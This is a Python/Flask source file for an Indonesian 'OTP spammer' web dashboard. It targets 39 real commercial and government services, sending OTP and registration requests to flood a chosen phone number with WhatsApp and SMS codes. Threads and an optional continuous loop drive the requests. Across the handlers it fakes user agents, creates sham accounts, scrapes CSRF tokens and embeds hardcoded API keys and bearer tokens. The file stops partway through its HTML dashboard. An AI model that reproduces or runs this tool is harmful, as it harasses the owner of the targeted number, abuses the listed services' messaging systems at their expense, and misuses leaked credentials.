#!/usr/bin/env python3
"""
EL CIENCO - OTP SPAMMER WEB DASHBOARD v7.1
39 API LENGKAP - Unlimited - No License
FIX: Semua handler didefinisikan
Run: python app.py
Access: http://localhost:5000
"""

import os
import sys
import json
import time
import random
import string
import threading
import webbrowser
import requests
import re
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from flask import Flask, request, jsonify
except ImportError:
    print("[!] Install: pip install flask requests")
    input("Tekan Enter...")
    sys.exit(1)

app = Flask(__name__)
app.secret_key = "EL_CIENCO_2310"

is_running = False
spam_thread = None
stop_flag = False
log_messages = []
stats = {"total": 0, "success": 0, "failed": 0}

# ============ USER AGENTS ============
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)

# ============ UTILITY ============
def normalize(phone):
    n = phone.strip().replace(' ', '').replace('-', '').replace('+', '')
    if n.startswith('08'): return '62' + n[1:]
    if n.startswith('8'): return '62' + n
    if n.startswith('62'): return n
    return ''

def fmt_08(p):
    return '0' + p[2:] if p.startswith('62') else p

def fmt_nocode(p):
    return p[2:] if p.startswith('62') else p

def fmt_plus(p):
    return '+' + p

def fmt_phone_only(p):
    return p[2:] if p.startswith('62') else p

# ============ HANDLER 1-15 ============

def send_pinhome_otp(phone):
    url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
    headers = {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": get_random_ua(), "Origin": "https://www.pinhome.id"}
    payload = f'{{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{phone}"}}'
    try:
        return requests.post(url, headers=headers, data=payload, timeout=15)
    except:
        return None

def send_maulagi_otp(phone):
    url = "https://api.maulagi.id/api/v2/auth/check"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua(), "x-ml-key": "C59RUHBU59"}
    try:
        return requests.post(url, json={"credentials": phone}, headers=headers, timeout=15)
    except:
        return None

def send_rumah123_otp(phone):
    url = "https://www.rumah123.com/api/otp/request-otp"
    headers = {"Content-Type": "application/json;charset=UTF-8", "User-Agent": get_random_ua()}
    payload = {"phoneNumber": phone, "portalId": 1, "type": "WHATSAPP"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

def send_paper_otp(phone):
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua(), "x-paper-user-agent": "multiverse/2.54.1 mobile_web (android) chrome"}
    try:
        return requests.post(url, json={"phone": phone, "method": "whatsapp", "registered_by": "flutter mweb"}, headers=headers, timeout=15)
    except:
        return None

def send_duniagames_otp(phone):
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua(), "x-device": str(uuid.uuid4())}
    try:
        return requests.post(url, json={"phoneNumber": phone, "userName": phone}, headers=headers, timeout=15)
    except:
        return None

def send_bunda_otp(phone):
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, json={"phone_number": phone, "type": "auth"}, headers=headers, timeout=15)
    except:
        return None

def send_bonusbelanja_otp(phone):
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, json={"phone": phone, "name": "User", "agreeTnc": True, "agreeContact": True}, headers=headers, timeout=15)
    except:
        return None

def send_matahari_otp(phone):
    url = "https://matahari-backend-prod.matahari.com/api/auth/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
    payload = {"emailAddress": f"{name}@gmail.com", "name": name, "mobileNumber": phone, "birthDate": "2000-01-01", "genderId": "1", "password": "Test123!"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

def send_hijup_otp(phone):
    url = "https://www.hijup.com/sign_in"
    headers = {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, data=f'[{{"phone_number":"{phone}","store_path":"hijup"}}]', headers=headers, timeout=15)
    except:
        return None

def send_alodokter_otp(phone):
    url = "https://www.alodokter.com/resend-otp"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, json={"user": {"phone": phone, "uuid": str(uuid.uuid4())}, "request_via": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

def send_bliblitiket_otp(phone):
    url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
    headers = {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": get_random_ua(), "x-request-id": str(uuid.uuid4()), "x-channel-id": "MWEB", "x-lang": "id", "x-entity": "TIKET"}
    try:
        return requests.post(url, json={"action": "REGISTER_OTP", "channel": "WHATS_APP", "recipient": phone}, headers=headers, timeout=15)
    except:
        return None

def send_ohsome_otp(phone):
    url = "https://ohsome.co.id/api/member/user/random_code_check"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua(), "deviceid": uuid.uuid4().hex[:32], "x-store-no": "SC001"}
    try:
        return requests.post(url, json={"country_code": "62", "account": phone, "type_id": 2, "device_id": uuid.uuid4().hex[:32]}, headers=headers, timeout=15)
    except:
        return None

def send_optik_otp(phone):
    url = "https://api.optikmelawai.com/api/v3/auth/register/1"
    headers = {"User-Agent": get_random_ua()}
    data = {"name": "User", "sex": "1", "birth_date": "2000-01-01", "mobile_number": phone, "password": "Test123", "repassword": "Test123"}
    try:
        return requests.post(url, data=data, headers=headers, timeout=15)
    except:
        return None

def send_holland_otp(phone):
    url = "https://www.hollandbakery.co.id/resend-otp-register"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, data={"phone": phone}, headers=headers, timeout=15)
    except:
        return None

# ============ HANDLER 16-39 ============

def send_planetban_otp(phone):
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
    payload = {"name": "Test", "phone": phone, "password": "Test123", "purpose": "register", "method": "whatsapp"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

def send_tuneup_otp(phone):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        "company_name": "PT " + name.capitalize(),
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": phone,
        "province_code": "32",
        "city_code": "32.04",
        "subscription_id": "undefined",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    headers = {"User-Agent": get_random_ua()}
    try:
        return requests.post(url, data=data, headers=headers, timeout=15)
    except:
        return None

def send_hashmicro_otp(phone):
    url = "https://website-api.hashmicro.com/api/add/3"
    name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
    data = {
        'medium': '55', 'type_button': 'mulai-konsultasi', 'fullname': name,
        'phonenumber': phone, 'email': f'{name.lower()}@gmail.com',
        'companyname': 'PT ' + name, 'company_size': 'small',
        'solution': '43', 'industry': random.choice(['178', '179', '180']),
        'message': 'Test', 'country': '100', 'clr_id': 'mq51xj8x-WzwfG4IcQKi0c056',
        'source': '143', 'user_agent': get_random_ua(),
        'fingerprint': uuid.uuid4().hex,
    }
    headers = {"User-Agent": get_random_ua()}
    payload_str = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in data.items()])
    try:
        return requests.post(url, headers=headers, data=payload_str, timeout=15)
    except:
        return None

def send_internetrakyat_otp(phone):
    url = "https://internetrakyat.id/api/app/auth/send-otp-register"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json", "x-api-key": "280999!FTTH"}
    try:
        return requests.post(url, json={"phone_number": phone}, headers=headers, timeout=15)
    except:
        return None

def send_ultramilk_otp(phone):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    payload = {
        "name": name,
        "email": name.lower() + '@gmail.com',
        "password": 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1',
        "phone_number": phone,
        "portal": "IcownicPatch",
        "is_consent": True
    }
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

def send_kaniva_otp(phone):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_ua()})
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if match:
        csrf = match.group(1)
    if not csrf:
        return None
    url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
    headers = {"X-XSRF-TOKEN": csrf, "X-Inertia": "true", "Content-Type": "application/json", "User-Agent": get_random_ua()}
    name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    try:
        return sess.post(url, json={"name": name, "phone": phone}, headers=headers, timeout=15)
    except:
        return None

def send_jembatani_otp(phone):
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json", "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98"}
    name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    password = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
    payload = {"phone_number": phone, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
    try:
        resp = requests.post("https://api.jembatani.co.id/v1/register", json=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp
        resp2 = requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json={"phone_number": phone}, headers=headers, timeout=15)
        return resp2
    except:
        return None

def send_rcx_otp(phone):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_ua()})
    try:
        r = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = sess.cookies["XSRF-TOKEN"]
    if not token:
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
        if match:
            token = match.group(1)
    if not token:
        return None
    name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    email = f'user{random.randint(1000,9999)}@mailnesia.com'
    data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": phone}
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": get_random_ua()}
    try:
        return sess.post("https://sso.rcx.co.id/auth/passwordless/request", headers=headers, data=data, allow_redirects=False, timeout=15)
    except:
        return None

def send_sahabatteknisi_otp(phone):
    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phone": phone}, headers=headers, timeout=15)
    except:
        return None

def send_auto2000_otp(phone):
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phoneNumber": phone, "isCheckOtpLimit": True, "uniqueID": phone, "isLogin": False}, headers=headers, timeout=15)
    except:
        return None

def send_astra_daihatsu_otp(phone):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_ua()})
    try:
        r = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"
    headers = {"Content-Type": "application/json", "csrftoken": csrf, "User-Agent": get_random_ua()}
    try:
        return sess.post("https://www.astra-daihatsu.id/otp/whatsapp/generate", json={"phoneNo": phone}, headers=headers, timeout=20)
    except:
        return None

def send_royal_canin_otp(phone):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_ua()})
    try:
        r = sess.get("https://club.royalcanin.id/sign-up", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    try:
        return sess.post("https://club.royalcanin.id/api/get_otp", json={"params": {"Email": "", "mobile_number": phone, "OTPType": "IM"}}, timeout=20)
    except:
        return None

def send_watsons_otp(phone):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json", "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg"}
    try:
        return requests.post(url, json={"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone, "type": "WHATSAPP"}, headers=headers, timeout=15)
    except:
        return None

def send_99co_otp(phone):
    url = "https://www.99.co/id/api/biz/messaging/otp-events"
    token = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, json={"brand": "99id", "destination_address": phone, "type_id": 2}, headers=headers, timeout=15)
    except:
        return None

def send_belirumah_otp(phone):
    url = "https://api.belirumah.co/api/otp/request_new"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phone_number": phone}, headers=headers, timeout=15)
    except:
        return None

def send_fastwork_otp(phone):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phone_number": phone}, headers=headers, timeout=15)
    except:
        return None

def send_hrsbre_otp(phone):
    url = "https://career.hrs-bre.site/auth/sign_up_action"
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n"
            f"--{boundary}--\r\n")
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "User-Agent": get_random_ua()}
    try:
        return requests.post(url, headers=headers, data=body, timeout=15)
    except:
        return None

def send_erafone_otp(phone):
    url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json", "otp-client": "erafone", "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=", "otp-provider": "whatsapp", "signature": "d2afc6a94fc469d0633f477ed2a73a155bc379d8d138d5e9885a2b612bb3d077", "source": "erafone", "device-id": "c1aab237-131a-4965-9838-116eb9788000"}
    try:
        return requests.post(url, json={"identifier": phone, "type": "identifier_validation"}, headers=headers, timeout=15)
    except:
        return None

def send_beautyhaul_otp(phone):
    base = "https://www.beautyhaul.com"
    name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_ua()})
    reg_payload = {"nama_depan": name, "nama_belakang": name, "email": email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": phone, "password": password, "konfirmasi_password": password, "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "subscribe": "true", "terms": "true"}
    try:
        sess.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
    except:
        pass
    try:
        return sess.post(f"{base}/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=12)
    except:
        return None

def send_hainaya_otp(phone):
    url = "https://app.hainaya.id/api/onboarding/register"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    name = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
    payload = {"business_name": "Tst" + name + str(random.randint(10,999)), "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone, "owner_name": "", "owner_phone": phone}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            return requests.post(login_url, json={"phone_number": phone}, headers=headers, timeout=15)
        return resp
    except:
        return None

def send_minumyukkaka_otp(phone):
    sess = requests.Session()
    first_name = ''.join(random.choices(string.ascii_letters, k=6)).capitalize()
    email = f"{first_name.lower()}{random.randint(100,999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    register_data = {"registerModel[first_name]": first_name, "registerModel[last_name]": "", "registerModel[email]": email, "registerModel[phone]": phone, "registerModel[password]": password, "registerModel[verify_password]": password}
    try:
        sess.post("https://minumyukkaka.com/services/liquid/Register", data=register_data, timeout=15)
    except:
        pass
    x_sat = ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    headers = {"x-sat": x_sat, "User-Agent": get_random_ua()}
    try:
        return sess.post("https://minumyukkaka.com/services/identity/requestOTP", data={"destination": phone, "otpLength": "6"}, headers=headers, timeout=15)
    except:
        return None

def send_sidemang_otp(phone):
    email_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"{email_name}{random.randint(100,999)}@gmail.com"
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phoneNumber": phone, "email": email}, headers=headers, timeout=15)
    except:
        return None

def send_lapormasbup_otp(phone):
    url = "https://lapormasbup.klaten.go.id/api/register"
    name = ''.join(random.choices(string.ascii_letters, k=6)).capitalize()
    email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    payload = {"name": name, "email": email, "mobilephone": phone, "gender": random.choice(["Laki-Laki", "Perempuan"]), "warga_birth_date": f"{random.randint(1966,2010)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}", "password": password, "address": "Jl. Test No. 123"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

def send_ptsp_kemenag_otp(phone):
    name = ''.join(random.choices(string.ascii_letters, k=6)).capitalize()
    email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + "$"
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"nama": name, "wa": phone, "email": email, "password": password}, headers=headers, timeout=15)
    except:
        return None

# ============ ALL 39 TARGETS ============
TARGETS = [
    {'name': 'Pinhome', 'func': send_pinhome_otp, 'fmt': fmt_nocode},
    {'name': 'Maulagi', 'func': send_maulagi_otp, 'fmt': fmt_08},
    {'name': 'Rumah123', 'func': send_rumah123_otp, 'fmt': lambda p: p},
    {'name': 'Paper', 'func': send_paper_otp, 'fmt': lambda p: p},
    {'name': 'Dunia Games', 'func': send_duniagames_otp, 'fmt': fmt_plus},
    {'name': 'Bunda Hospital', 'func': send_bunda_otp, 'fmt': lambda p: int(p) if p.isdigit() else p},
    {'name': 'Bonus Belanja', 'func': send_bonusbelanja_otp, 'fmt': lambda p: p},
    {'name': 'Matahari', 'func': send_matahari_otp, 'fmt': fmt_08},
    {'name': 'Hijup', 'func': send_hijup_otp, 'fmt': lambda p: p},
    {'name': 'Alodokter', 'func': send_alodokter_otp, 'fmt': fmt_08},
    {'name': 'Blibli Tiket', 'func': send_bliblitiket_otp, 'fmt': fmt_plus},
    {'name': 'Ohsome', 'func': send_ohsome_otp, 'fmt': fmt_phone_only},
    {'name': 'Optik Melawai', 'func': send_optik_otp, 'fmt': lambda p: p},
    {'name': 'Holland Bakery', 'func': send_holland_otp, 'fmt': lambda p: p},
    {'name': 'PlanetBan', 'func': send_planetban_otp, 'fmt': fmt_08},
    {'name': 'TuneUp', 'func': send_tuneup_otp, 'fmt': fmt_08},
    {'name': 'HashMicro', 'func': send_hashmicro_otp, 'fmt': fmt_phone_only},
    {'name': 'Internet Rakyat', 'func': send_internetrakyat_otp, 'fmt': fmt_08},
    {'name': 'Ultramilk', 'func': send_ultramilk_otp, 'fmt': lambda p: p},
    {'name': 'Kaniva', 'func': send_kaniva_otp, 'fmt': fmt_08},
    {'name': 'Jembatani', 'func': send_jembatani_otp, 'fmt': fmt_08},
    {'name': 'RCX', 'func': send_rcx_otp, 'fmt': fmt_08},
    {'name': 'Sahabat Teknisi', 'func': send_sahabatteknisi_otp, 'fmt': fmt_08},
    {'name': 'Auto2000', 'func': send_auto2000_otp, 'fmt': fmt_08},
    {'name': 'Astra Daihatsu', 'func': send_astra_daihatsu_otp, 'fmt': lambda p: p},
    {'name': 'Royal Canin', 'func': send_royal_canin_otp, 'fmt': fmt_plus},
    {'name': 'Watsons', 'func': send_watsons_otp, 'fmt': fmt_phone_only},
    {'name': '99.co', 'func': send_99co_otp, 'fmt': fmt_plus},
    {'name': 'Beli Rumah', 'func': send_belirumah_otp, 'fmt': fmt_plus},
    {'name': 'Fastwork', 'func': send_fastwork_otp, 'fmt': fmt_08},
    {'name': 'HRS-BRE', 'func': send_hrsbre_otp, 'fmt': fmt_08},
    {'name': 'Erafone', 'func': send_erafone_otp, 'fmt': lambda p: p},
    {'name': 'Beautyhaul', 'func': send_beautyhaul_otp, 'fmt': lambda p: p[2:]},
    {'name': 'Hainaya', 'func': send_hainaya_otp, 'fmt': fmt_phone_only},
    {'name': 'MinumYukKaka', 'func': send_minumyukkaka_otp, 'fmt': fmt_08},
    {'name': 'SIDEMANG', 'func': send_sidemang_otp, 'fmt': fmt_08},
    {'name': 'LaporMasBup', 'func': send_lapormasbup_otp, 'fmt': fmt_08},
    {'name': 'PTSP Kemenag', 'func': send_ptsp_kemenag_otp, 'fmt': fmt_08},
]

# ============ SPAM ENGINE ============
def log_message(msg, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_messages.append(f"[{timestamp}] {msg}")
    if len(log_messages) > 500:
        log_messages.pop(0)

def process_target(api, target, idx, total):
    global stats, stop_flag
    name = api['name']
    phone = api['fmt'](target)
    
    if stop_flag:
        return False
    
    try:
        resp = api['func'](phone)
        if stop_flag:
            return False
            
        if resp is not None and resp.status_code in [200, 201, 202]:
            stats["success"] += 1
            stats["total"] += 1
            log_message(f"✅ {name}: OTP terkirim (200)", "success")
            return True
        elif resp is not None and resp.status_code == 429:
            stats["failed"] += 1
            stats["total"] += 1
            log_message(f"⏳ {name}: Rate Limit (429)", "warning")
            return False
        else:
            stats["failed"] += 1
            stats["total"] += 1
            status = resp.status_code if resp is not None else "No Response"
            log_message(f"❌ {name}: Gagal ({status})", "error")
            return False
    except Exception as e:
        if not stop_flag:
            stats["failed"] += 1
            stats["total"] += 1
            log_message(f"⚠️ {name}: Error - {str(e)[:30]}", "warning")
        return False

def run_spam(targets, threads=5, mode="single"):
    global is_running, stats, stop_flag
    stats = {"total": 0, "success": 0, "failed": 0}
    stop_flag = False
    round_count = 0
    
    log_message(f"🚀 Memulai spam ke {len(targets)} nomor", "success")
    log_message(f"📡 Total API: {len(TARGETS)}", "info")
    
    while is_running and not stop_flag:
        round_count += 1
        if mode == "single" and round_count > 1:
            break
        
        log_message(f"🔄 Round {round_count} - {len(TARGETS)} API", "info")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS):
                if stop_flag or not is_running:
                    break
                futures.append(executor.submit(process_target, api, targets[0], idx+1, len(TARGETS)))
            
            for future in as_completed(futures):
                if stop_flag or not is_running:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    future.result(timeout=10)
                except:
                    pass
        
        if stop_flag or not is_running:
            break
        
        if mode == "single":
            break
        
        if is_running and not stop_flag:
            log_message(f"⏳ Istirahat 2 detik...", "info")
            for _ in range(2):
                if stop_flag or not is_running:
                    break
                time.sleep(1)
    
    is_running = False
    log_message(f"⏹ Selesai. Sukses: {stats['success']}, Gagal: {stats['failed']}", "warning")

# ============ HTML (SAMA SEPERTI SEBELUMNYA) ============
HTML = '''
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EL CIENCO · OTP STORM</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 10px; min-height: 100vh; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff41; padding: 10px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .title { font-size: 1.5em; text-shadow: 0 0 20px #00ff41; font-weight: bold; }
        .title small { font-size: 0.5em; color: #888; }
        .badge { padding: 5px 15px; border: 1px solid #00ff41; border-radius: 20px; font-size: 0.8em; background: rgba(0,255,65,0.1); }
        .badge.running { border-color: #00ff41; color: #00ff41; animation: pulse 1s infinite; }
        .badge.stopped { border-color: #ff4444; color: #ff4444; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin: 15px 0; }
        .stat-card { background: #111; border: 1px solid #222; padding: 10px; border-radius: 8px; text-align: center; }
        .stat-card .num { font-size: 1.8em; font-weight: bold; color: #00ff41; }
        .stat-card .label { font-size: 0.7em; color: #666; margin-top: 5px; }
        .stat-card.success .num { color: #00ff41; }
        .stat-card.failed .num { color: #ff4444; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 15px 0; }
        .card { background: #111; border: 1px solid #222; padding: 15px; border-radius: 10px; }
